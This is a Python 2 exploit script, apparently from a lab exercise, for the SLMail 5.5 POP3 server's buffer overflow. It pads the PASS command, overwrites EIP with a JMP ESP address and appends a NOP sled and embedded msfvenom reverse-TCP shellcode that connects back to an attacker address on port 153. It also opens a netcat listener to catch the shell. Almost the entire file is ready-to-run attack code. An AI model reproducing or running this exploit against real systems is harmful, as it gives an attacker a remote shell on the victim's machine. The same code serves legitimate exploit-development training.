#!/usr/bin/env python
# -*- coding:utf-8 -*-
import socket
import os

conexion=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

logo = """\n
	Script attack slmail 5.5
	Autor: Yonatan_Correa

	twitter: @Yonatan_correa
	Blog: https://risataim.blogspot.com

"""

host = "192.168.0.16" #ip de la maquina virtual
print logo

junk = "A" * 2606
eip = "\x63\x2d\x4c\x5f" #5F4C2D63 FF E4
nops = "\x90" * 16


# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.13 LPORT=153 -a x86 --platform windows -b "\x00\x0a\x0d" -f c
shell = ("\xdb\xd4\xd9\x74\x24\xf4\x5f\xbe\x41\xe5\xbd\xe5\x2b\xc9\xb1"
"\x52\x31\x77\x17\x03\x77\x17\x83\x86\xe1\x5f\x10\xf4\x02\x1d"
"\xdb\x04\xd3\x42\x55\xe1\xe2\x42\x01\x62\x54\x73\x41\x26\x59"
"\xf8\x07\xd2\xea\x8c\x8f\xd5\x5b\x3a\xf6\xd8\x5c\x17\xca\x7b"
"\xdf\x6a\x1f\x5b\xde\xa4\x52\x9a\x27\xd8\x9f\xce\xf0\x96\x32"
"\xfe\x75\xe2\x8e\x75\xc5\xe2\x96\x6a\x9e\x05\xb6\x3d\x94\x5f"
"\x18\xbc\x79\xd4\x11\xa6\x9e\xd1\xe8\x5d\x54\xad\xea\xb7\xa4"
"\x4e\x40\xf6\x08\xbd\x98\x3f\xae\x5e\xef\x49\xcc\xe3\xe8\x8e"
"\xae\x3f\x7c\x14\x08\xcb\x26\xf0\xa8\x18\xb0\x73\xa6\xd5\xb6"
"\xdb\xab\xe8\x1b\x50\xd7\x61\x9a\xb6\x51\x31\xb9\x12\x39\xe1"
"\xa0\x03\xe7\x44\xdc\x53\x48\x38\x78\x18\x65\x2d\xf1\x43\xe2"
"\x82\x38\x7b\xf2\x8c\x4b\x08\xc0\x13\xe0\x86\x68\xdb\x2e\x51"
"\x8e\xf6\x97\xcd\x71\xf9\xe7\xc4\xb5\xad\xb7\x7e\x1f\xce\x53"
"\x7e\xa0\x1b\xf3\x2e\x0e\xf4\xb4\x9e\xee\xa4\x5c\xf4\xe0\x9b"
"\x7d\xf7\x2a\xb4\x14\x02\xbd\x7b\x40\x0c\x30\x14\x93\x0c\x4a"
"\x7d\x1a\xea\x20\x6d\x4b\xa5\xdc\x14\xd6\x3d\x7c\xd8\xcc\x38"
"\xbe\x52\xe3\xbd\x71\x93\x8e\xad\xe6\x53\xc5\x8f\xa1\x6c\xf3"
"\xa7\x2e\xfe\x98\x37\x38\xe3\x36\x60\x6d\xd5\x4e\xe4\x83\x4c"
"\xf9\x1a\x5e\x08\xc2\x9e\x85\xe9\xcd\x1f\x4b\x55\xea\x0f\x95"
"\x56\xb6\x7b\x49\x01\x60\xd5\x2f\xfb\xc2\x8f\xf9\x50\x8d\x47"
"\x7f\x9b\x0e\x11\x80\xf6\xf8\xfd\x31\xaf\xbc\x02\xfd\x27\x49"
"\x7b\xe3\xd7\xb6\x56\xa7\xe8\xfc\xfa\x8e\x60\x59\x6f\x93\xec"
"\x5a\x5a\xd0\x08\xd9\x6e\xa9\xee\xc1\x1b\xac\xab\x45\xf0\xdc"
"\xa4\x23\xf6\x73\xc4\x61")


todo = junk + eip + nops + shell

conexion.connect((host,110))
conexion.recv(1024)
conexion.send('USER anonymous\r\n')
conexion.recv(1024)	
conexion.send('PASS ' + todo + '\r\n')
os.system("nc -vlp 153")
conexion.send('QUIT\r\n')
conexion.close()